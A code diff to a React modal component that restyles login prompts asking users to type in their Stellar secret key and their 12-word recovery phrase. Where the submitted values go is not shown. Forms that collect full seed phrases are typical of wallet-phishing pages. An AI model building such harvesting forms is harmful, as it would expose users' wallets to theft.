@@ -74,14 +74,16 @@ export default function Modals({
           <button className="closeModal" onClick={closeModal} aria-label="Close secret key modal">
             <i className="fa-solid fa-x"></i>
           </button>
-          <h1 id="secretKeyModalTitle">Login</h1>
-          <p>Please add your secret key below</p>
+          <div className="modal-header">
+            <h1 id="secretKeyModalTitle">Enter Secret Key</h1>
+            <p>Please enter your Stellar secret key to authenticate your wallet</p>
+          </div>
           <form className="inputSection flx fdc" onSubmit={e => { e.preventDefault(); handleSubmit("secret"); }}>
             <input 
               id="inputSecretKey" 
               className="loginInput" 
-              type="text" 
-              placeholder="Secret Key" 
+              type="password" 
+              placeholder="Enter your secret key (S...)" 
               ref={secretKeyRef} 
               required 
               autoFocus 
@@ -93,7 +95,7 @@ export default function Modals({
               type="submit" 
               disabled={isSubmitting}
             >
-              {isSubmitting ? "Submitting..." : "Submit"}
+              {isSubmitting ? "Authenticating..." : "Continue"}
             </button>
           </form>
         </div>
@@ -111,15 +113,17 @@ export default function Modals({
           <button className="closeModal" onClick={closeModal} aria-label="Close phrase modal">
             <i className="fa-solid fa-x"></i>
           </button>
-          <h1 id="phraseModalTitle">Login</h1>
-          <p>Please add your 12 phrase recovery key below</p>
+          <div className="modal-header">
+            <h1 id="phraseModalTitle">Enter Recovery Phrase</h1>
+            <p>Please enter your 12-word recovery phrase separated by spaces</p>
+          </div>
           <form className="inputSection flx fdc" onSubmit={e => { e.preventDefault(); handleSubmit("phrase"); }}>
             <textarea 
               id="PhraseInput" 
               className="loginInput" 
               cols={30} 
               rows={10} 
-              placeholder="12 phrase Key" 
+              placeholder="Enter your 12-word recovery phrase separated by spaces..." 
               ref={phraseRef} 
               required 
               autoFocus 
@@ -131,7 +135,7 @@ export default function Modals({
               type="submit"
               disabled={isSubmitting}
             >
-              {isSubmitting ? "Submitting..." : "Submit"}
+              {isSubmitting ? "Authenticating..." : "Continue"}
             </button>
           </form>
         </div>
